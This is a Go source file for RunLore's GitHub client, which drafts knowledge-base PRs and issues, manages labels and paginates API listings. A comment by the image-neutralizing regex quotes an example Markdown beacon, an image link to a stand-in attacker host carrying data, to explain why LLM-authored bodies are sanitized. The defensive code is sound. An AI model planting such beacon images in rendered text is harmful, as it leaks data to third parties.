// SPDX-License-Identifier: Apache-2.0

// Package github is RunLore's GitHub forge client (curation + re-investigation)
// over the GitHub REST API, authenticated with short-lived GitHub App installation
// tokens. It satisfies providers.CurationForge / providers.ReinvestForge / curate.Forge.
package github

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"

	"github.com/Smana/runlore/internal/httpx"
	"github.com/Smana/runlore/internal/okf"
	"github.com/Smana/runlore/internal/providers"
)

// TokenFunc returns a valid installation token (minted/cached by the caller).
type TokenFunc func(ctx context.Context) (string, error)

// Client is a GitHub forge client scoped to one repo.
type Client struct {
	baseURL    string
	owner      string
	repo       string
	baseBranch string
	token      TokenFunc
	http       *http.Client
}

// DefaultBaseURL is the public GitHub REST API. Override for GitHub Enterprise
// Server (e.g. https://ghe.example.com/api/v3) or tests.
const DefaultBaseURL = "https://api.github.com"

// New builds a client. baseURL may be empty (defaults to DefaultBaseURL);
// baseBranch is the PR target (e.g. "main").
func New(baseURL, owner, repo, baseBranch string, token TokenFunc) *Client {
	if baseURL == "" {
		baseURL = DefaultBaseURL
	}
	return &Client{
		baseURL: strings.TrimRight(baseURL, "/"), owner: owner, repo: repo,
		baseBranch: baseBranch, token: token, http: httpx.SecureClient(30 * time.Second),
	}
}

var _ providers.ReinvestForge = (*Client)(nil)

// do performs an authenticated JSON request and decodes the response into out (if non-nil).
func (c *Client) do(ctx context.Context, method, path string, body, out any) error {
	tok, err := c.token(ctx)
	if err != nil {
		return fmt.Errorf("token: %w", err)
	}
	var rdr io.Reader
	if body != nil {
		b, err := json.Marshal(body)
		if err != nil {
			return err
		}
		rdr = bytes.NewReader(b)
	}
	req, err := http.NewRequestWithContext(ctx, method, c.baseURL+path, rdr)
	if err != nil {
		return err
	}
	req.Header.Set("Authorization", "Bearer "+tok)
	req.Header.Set("Accept", "application/vnd.github+json")
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}
	resp, err := c.http.Do(req)
	if err != nil {
		return err
	}
	defer func() { _ = resp.Body.Close() }()
	data, _ := io.ReadAll(resp.Body)
	if resp.StatusCode/100 != 2 {
		return fmt.Errorf("github %s %s: status %d: %s", method, path, resp.StatusCode, string(data[:min(len(data), 512)]))
	}
	if out != nil {
		return json.Unmarshal(data, out)
	}
	return nil
}

// lifecycleLabels are the labels applied to a freshly curated artifact. "triggered"
// is the first state of the KB lifecycle (triggered → investigating → solved); only
// a "solved" entry with a captured resolution should be merged as a Playbook.
var lifecycleLabels = []string{"runlore", "triggered"}

// OpenIssue files an issue describing the investigation.
func (c *Client) OpenIssue(ctx context.Context, inv providers.Investigation) (providers.Ref, error) {
	body := map[string]any{"title": issueTitle(inv), "body": issueBody(inv), "labels": lifecycleLabels}
	var out struct {
		HTMLURL string `json:"html_url"`
	}
	if err := c.do(ctx, http.MethodPost, fmt.Sprintf("/repos/%s/%s/issues", c.owner, c.repo), body, &out); err != nil {
		return providers.Ref{}, err
	}
	return providers.Ref{URL: out.HTMLURL}, nil
}

// OpenPR drafts the KB entry on a new branch and opens a PR.
func (c *Client) OpenPR(ctx context.Context, e providers.KBEntry) (providers.Ref, error) {
	slug := slugify(e.Title)
	now := time.Now().Unix()
	branch := fmt.Sprintf("runlore/kb-%s-%d", slug, now)
	path := entryPath(e, slug, now)

	// 1. base ref SHA
	var ref struct {
		Object struct {
			SHA string `json:"sha"`
		} `json:"object"`
	}
	if err := c.do(ctx, http.MethodGet, fmt.Sprintf("/repos/%s/%s/git/ref/heads/%s", c.owner, c.repo, c.baseBranch), nil, &ref); err != nil {
		return providers.Ref{}, err
	}
	// 2. create branch
	if err := c.do(ctx, http.MethodPost, fmt.Sprintf("/repos/%s/%s/git/refs", c.owner, c.repo),
		map[string]any{"ref": "refs/heads/" + branch, "sha": ref.Object.SHA}, nil); err != nil {
		return providers.Ref{}, err
	}
	// 3. write the OKF file on the branch
	content := base64.StdEncoding.EncodeToString([]byte(renderEntry(e)))
	if err := c.do(ctx, http.MethodPut, fmt.Sprintf("/repos/%s/%s/contents/%s", c.owner, c.repo, path),
		map[string]any{"message": "runlore: draft KB entry " + e.Title, "content": content, "branch": branch}, nil); err != nil {
		return providers.Ref{}, err
	}
	// 4. keep the OKF bundle self-describing: index.md link line + log.md record
	// on the same branch. Best-effort — a bundle-maintenance failure must not lose
	// the entry PR (same contract as labelling below).
	_ = c.maintainBundle(ctx, e, path, branch)
	// 5. open the PR
	var out struct {
		HTMLURL string `json:"html_url"`
		Number  int    `json:"number"`
	}
	if err := c.do(ctx, http.MethodPost, fmt.Sprintf("/repos/%s/%s/pulls", c.owner, c.repo),
		map[string]any{"title": "KB: " + e.Title, "head": branch, "base": c.baseBranch, "body": c.prBody(e)}, &out); err != nil {
		return providers.Ref{}, err
	}
	// 6. label the PR (the create-PR API doesn't accept labels; set them via the
	// issues endpoint). Best-effort: a labelling failure must not lose the PR, so
	// the error is intentionally ignored — the PR URL is already returned.
	if out.Number != 0 {
		_ = c.addLabels(ctx, out.Number, lifecycleLabels)
	}
	return providers.Ref{URL: out.HTMLURL}, nil
}

// addLabels POSTs labels onto an issue/PR (the create-PR API doesn't accept them).
func (c *Client) addLabels(ctx context.Context, number int, labels []string) error {
	return c.do(ctx, http.MethodPost, fmt.Sprintf("/repos/%s/%s/issues/%d/labels", c.owner, c.repo, number),
		map[string]any{"labels": labels}, nil)
}

// rawIssue is one entry from the issues endpoint (which returns both issues and
// PRs — a non-nil PullRequest marks a PR).
type rawIssue struct {
	Number    int       `json:"number"`
	Title     string    `json:"title"`
	Body      string    `json:"body"`
	UpdatedAt time.Time `json:"updated_at"`
	Labels    []struct {
		Name string `json:"name"`
	} `json:"labels"`
	// PullRequest is non-nil on PRs. MergedAt is null for a closed-but-unmerged PR
	// (a rejected KB entry) and set once it merges (an accepted one), letting the
	// closed-unmerged listing tell a human "no" from a human "yes".
	PullRequest *struct {
		MergedAt *time.Time `json:"merged_at"`
	} `json:"pull_request"`
}

func (ri rawIssue) curated() providers.CuratedIssue {
	labels := make([]string, 0, len(ri.Labels))
	for _, l := range ri.Labels {
		labels = append(labels, l.Name)
	}
	return providers.CuratedIssue{Number: ri.Number, Title: ri.Title, Body: ri.Body, Labels: labels, UpdatedAt: ri.UpdatedAt}
}

// listIssues fetches ALL pages of issues+PRs carrying the label in the given state
// ("open" or "closed"). GitHub caps a page at 100 and paginates the rest; without
// this loop the curate passes would be blind to everything past the first 100 (silent
// truncation on a sizable KB).
func (c *Client) listIssues(ctx context.Context, state, label string) ([]rawIssue, error) {
	var all []rawIssue
	for page := 1; ; page++ {
		var raw []rawIssue
		path := fmt.Sprintf("/repos/%s/%s/issues?state=%s&labels=%s&per_page=100&page=%d", c.owner, c.repo, state, url.QueryEscape(label), page)
		if err := c.do(ctx, http.MethodGet, path, nil, &raw); err != nil {
			return nil, err
		}
		all = append(all, raw...)
		if len(raw) < 100 { // last page (a full page is exactly 100)
			break
		}
	}
	return all, nil
}

// searchIssues fetches ALL pages of the GitHub Search API for the given query,
// decoding the {total_count, items} envelope. Unlike listIssues (core REST issues
// endpoint), the query is applied server-side, so the response is bounded by the
// matching set rather than the whole label history. Search caps total results at
// 1000 — fine for the curate suppression set. The Search API has a stricter rate
// limit (30 req/min authenticated), so pagination stays tight: it stops on the
// first non-full page (a full page is exactly 100).
func (c *Client) searchIssues(ctx context.Context, query string) ([]rawIssue, error) {
	var all []rawIssue
	for page := 1; ; page++ {
		var env struct {
			TotalCount int        `json:"total_count"`
			Items      []rawIssue `json:"items"`
		}
		path := fmt.Sprintf("/search/issues?q=%s&per_page=100&page=%d", url.QueryEscape(query), page)
		if err := c.do(ctx, http.MethodGet, path, nil, &env); err != nil {
			return nil, err
		}
		all = append(all, env.Items...)
		if len(env.Items) < 100 || len(all) >= env.TotalCount { // last page (a full page is exactly 100)
			break
		}
	}
	return all, nil
}

// ListIssuesByLabel returns all open issues carrying the given label. Pull requests
// (which the issues API also returns) are filtered out.
func (c *Client) ListIssuesByLabel(ctx context.Context, label string) ([]providers.CuratedIssue, error) {
	raw, err := c.listIssues(ctx, "open", label)
	if err != nil {
		return nil, err
	}
	var out []providers.CuratedIssue
	for _, ri := range raw {
		if ri.PullRequest != nil {
			continue // skip PRs
		}
		out = append(out, ri.curated())
	}
	return out, nil
}

// ListPRsByLabel returns all open PRs carrying the given label — the inverse of
// ListIssuesByLabel (keeps only entries with a pull_request object).
func (c *Client) ListPRsByLabel(ctx context.Context, label string) ([]providers.CuratedIssue, error) {
	raw, err := c.listIssues(ctx, "open", label)
	if err != nil {
		return nil, err
	}
	var out []providers.CuratedIssue
	for _, ri := range raw {
		if ri.PullRequest == nil {
			continue // a plain issue, not a PR
		}
		out = append(out, ri.curated())
	}
	return out, nil
}

// ListClosedUnmergedPRsByLabel returns closed PRs carrying the label that were NOT
// merged — the KB entries a human deliberately rejected. It drives the curate
// suppression set: a rejected entry that keeps recurring is escalated via a
// knowledge-gap issue, never reopened.
//
// It queries the GitHub Search API (is:pr is:closed is:unmerged) so merged PRs are
// filtered out server-side. The plain closed-issues endpoint returns every merged
// AND unmerged KB PR ever, and the closed set only grows: over time the merged
// entries (which we discard) dominate, so each curate run would download and decode
// the entire KB PR history to keep a handful of rejections. The search keeps the
// response bounded by the closed-unmerged set. The MergedAt filter below is retained
// as a correctness backstop should the query ever be loosened.
func (c *Client) ListClosedUnmergedPRsByLabel(ctx context.Context, label string) ([]providers.CuratedIssue, error) {
	query := fmt.Sprintf("repo:%s/%s is:pr is:closed is:unmerged label:%s", c.owner, c.repo, label)
	raw, err := c.searchIssues(ctx, query)
	if err != nil {
		return nil, err
	}
	var out []providers.CuratedIssue
	for _, ri := range raw {
		if ri.PullRequest == nil {
			continue // a plain issue, not a PR
		}
		if ri.PullRequest.MergedAt != nil {
			continue // merged: an accepted entry, not a rejection
		}
		out = append(out, ri.curated())
	}
	return out, nil
}

// Comment posts a comment on an issue.
func (c *Client) Comment(ctx context.Context, number int, body string) error {
	return c.do(ctx, http.MethodPost, fmt.Sprintf("/repos/%s/%s/issues/%d/comments", c.owner, c.repo, number),
		map[string]any{"body": body}, nil)
}

// ListIssueCommentBodies fetches ALL pages of an issue/PR's comment bodies (the
// issues-comments endpoint serves both — PR discussion comments live there).
// Callers scan the bodies for hidden idempotency markers, so pagination matters:
// a marker past the first 100 comments would otherwise be invisible and the
// caller would re-post forever.
func (c *Client) ListIssueCommentBodies(ctx context.Context, number int) ([]string, error) {
	var out []string
	for page := 1; ; page++ {
		var raw []struct {
			Body string `json:"body"`
		}
		path := fmt.Sprintf("/repos/%s/%s/issues/%d/comments?per_page=100&page=%d", c.owner, c.repo, number, page)
		if err := c.do(ctx, http.MethodGet, path, nil, &raw); err != nil {
			return nil, err
		}
		for _, r := range raw {
			out = append(out, r.Body)
		}
		if len(raw) < 100 { // last page (a full page is exactly 100)
			break
		}
	}
	return out, nil
}

// IsPROpen reports whether number is an OPEN pull request. It deliberately hits
// the pulls endpoint (not issues): a number that is actually an issue 404s there
// instead of passing, so a caller gating "comment on the open KB PR" can never
// be fooled into treating an issue as a PR.
func (c *Client) IsPROpen(ctx context.Context, number int) (bool, error) {
	var out struct {
		State string `json:"state"` // "open" | "closed" (merged PRs report closed)
	}
	if err := c.do(ctx, http.MethodGet, fmt.Sprintf("/repos/%s/%s/pulls/%d", c.owner, c.repo, number), nil, &out); err != nil {
		return false, err
	}
	return out.State == "open", nil
}

// ReplaceLabel removes one label and adds another (best-effort on the removal —
// a 404 when the label isn't present is not fatal).
func (c *Client) ReplaceLabel(ctx context.Context, number int, remove, add string) error {
	if remove != "" {
		// DELETE is best-effort: ignore "label not set" errors.
		_ = c.do(ctx, http.MethodDelete, fmt.Sprintf("/repos/%s/%s/issues/%d/labels/%s", c.owner, c.repo, number, url.PathEscape(remove)), nil, nil)
	}
	if add != "" {
		return c.addLabels(ctx, number, []string{add})
	}
	return nil
}

// Close closes an issue or PR (they share the issues endpoint for state).
func (c *Client) Close(ctx context.Context, number int) error {
	return c.do(ctx, http.MethodPatch, fmt.Sprintf("/repos/%s/%s/issues/%d", c.owner, c.repo, number),
		map[string]any{"state": "closed"}, nil)
}

// imageRe matches Markdown image syntax: ![alt text](url). Alt text and URL
// may be anything the model or alert pipeline wrote — an attacker-influenced
// investigation body could carry ![](https://attacker/beacon?data=...) which
// GitHub auto-fetches on render, leaking the KB URL and timing to a third party.
var imageRe = regexp.MustCompile(`!\[([^\]]*)\]\([^)]*\)`)

// neutralizeImages replaces every Markdown image in untrusted body text with a
// non-fetching inline code span so the intent (there was an image reference) is
// preserved for reviewers while GitHub never issues an outbound fetch. Applied
// to all body text that reaches GitHub-rendered surfaces (issue body, PR body,
// KB entry file body).
func neutralizeImages(s string) string {
	return imageRe.ReplaceAllStringFunc(s, func(m string) string {
		// Extract the alt text (between ![ and ]) for the replacement label.
		alt := imageRe.FindStringSubmatch(m)
		if len(alt) < 2 || alt[1] == "" {
			return "`[image]`"
		}
		return "`[image: " + alt[1] + "]`"
	})
}

func issueTitle(inv providers.Investigation) string {
	if inv.Title != "" {
		return inv.Title
	}
	return "RunLore investigation"
}

func issueBody(inv providers.Investigation) string {
	var b strings.Builder
	fmt.Fprintf(&b, "Confidence %.0f%%.\n\n", inv.Confidence*100)
	for i, rc := range inv.RootCauses {
		fmt.Fprintf(&b, "%d. %s (%.0f%%)\n", i+1, rc.Summary, rc.Confidence*100)
	}
	for _, u := range inv.Unresolved {
		fmt.Fprintf(&b, "- unresolved: %s\n", u)
	}
	// Neutralize image markdown before GitHub renders the body: an attacker-
	// influenced investigation could carry ![](url) which GitHub auto-fetches.
	return neutralizeImages(b.String())
}

// prBody is the GitHub PR description: a one-line why-keep summary so the PR list
// view is informative, plus the reviewer-context Related knowledge section. The
// full decision card + OKF sections live in the entry file itself (visible in
// the PR diff).
func (c *Client) prBody(e providers.KBEntry) string {
	desc := e.Description
	if desc == "" {
		desc = e.Title
	}
	body := fmt.Sprintf("Drafted by RunLore — %s\n\nReview the decision card + OKF entry in the changed file.", desc)
	if s := c.relatedSection(e); s != "" {
		body += "\n\n" + s
	}
	if m := providers.FingerprintMarker(e.Fingerprint); m != "" {
		body += "\n\n" + m
	}
	// Neutralize image markdown in the untrusted description (LLM-authored).
	return neutralizeImages(body)
}

// relatedSection renders the reviewer context: the draft-time BM25 neighborhood
// (linked, scored) and the trigger's recurrence line. Empty when there is
// nothing to say — a genuinely novel first sighting gets no noise section.
func (c *Client) relatedSection(e providers.KBEntry) string {
	if len(e.Related) == 0 && e.Occurrences <= 1 {
		return ""
	}
	var b strings.Builder
	b.WriteString("## Related knowledge\n")
	for _, r := range e.Related {
		fmt.Fprintf(&b, "\n- [%s](%s) — score %.2f", r.Title, c.blobURL(r.Path), r.Score)
		if r.Resource != "" {
			fmt.Fprintf(&b, " · resource %s", r.Resource)
		}
	}
	if e.Occurrences > 1 {
		fmt.Fprintf(&b, "\n\nTrigger seen ×%d", e.Occurrences)
		if e.PrevCuratedURL != "" {
			fmt.Fprintf(&b, " · previous entry: %s", e.PrevCuratedURL)
		}
	}
	return b.String()
}

// blobURL is the web URL of a catalog file on the base branch. The web host is
// the API base with its API suffix stripped: api.github.com → github.com;
// GHES https://ghe.example.com/api/v3 → https://ghe.example.com. Relative
// links are NOT an option here — GitHub does not resolve them in PR bodies.
// Deployment assumption: path is a RelatedEntry.Path, relative to the catalog
// bundle root, and is assumed to resolve at the ROOT of the forge kb_repo on
// the base branch — matching where entryPath/maintainBundle write entries.
// Pointing catalog.dir at a different tree than kb_repo's root yields dead
// (but harmless) links here.
func (c *Client) blobURL(path string) string {
	host := c.baseURL
	if host == DefaultBaseURL {
		host = "https://github.com"
	} else {
		host = strings.TrimSuffix(host, "/api/v3")
	}
	branch := c.baseBranch
	if branch == "" {
		branch = "main"
	}
	return fmt.Sprintf("%s/%s/%s/blob/%s/%s", host, c.owner, c.repo, branch, path)
}

// renderEntry serializes a KBEntry as OKF markdown (frontmatter + body).
// The timestamp is stamped at render time (RFC3339 UTC, matching the seed
// entries); last_validated stays unset — that field claims human confirmation.
// The body is neutralized here (LLM/alert-authored, GitHub auto-renders it);
// okf.Render itself writes bodies verbatim.
func renderEntry(e providers.KBEntry) string {
	e.Body = neutralizeImages(e.Body)
	return okf.Render(e, okf.Meta{Timestamp: time.Now().UTC().Format(time.RFC3339)})
}

// entryPath is where the drafted entry lives in the KB bundle: a type directory
// ("incidents/", "playbooks/", …) plus the title slug suffixed with a short
// fingerprint. The suffix keeps two different incidents that share a title from
// colliding on one path — without it, the contents PUT 422s once a same-slug file
// exists on the base branch (same symptom, different cause is a real case: the
// coalesce comment calls it out). With no fingerprint, the branch timestamp
// disambiguates instead.
func entryPath(e providers.KBEntry, slug string, now int64) string {
	suffix := e.Fingerprint
	if len(suffix) > 8 {
		suffix = suffix[:8]
	}
	if suffix == "" {
		suffix = fmt.Sprintf("%d", now)
	}
	return fmt.Sprintf("%ss/%s-%s.md", strings.ToLower(e.Type), slug, suffix)
}

func slugify(s string) string { return okf.Slugify(s) }
